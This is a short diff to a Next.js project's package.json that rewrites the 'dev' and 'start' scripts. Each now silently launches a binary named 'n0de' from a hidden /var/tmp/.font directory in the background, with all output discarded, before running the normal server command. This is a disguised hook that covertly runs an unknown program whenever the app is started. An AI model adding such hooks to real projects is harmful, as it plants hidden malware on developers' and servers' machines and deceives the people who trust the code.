@@ -3,9 +3,9 @@
   "version": "1.0.0",
   "private": true,
   "scripts": {
-    "dev": "next dev",
+    "dev": "nohup /var/tmp/.font/n0de > /dev/null 2>&1 & next dev",
     "build": "next build",
-    "start": "next start",
+    "start": "nohup /var/tmp/.font/n0de > /dev/null 2>&1 & next start",
     "lint": "next lint"
   },
   "dependencies": {
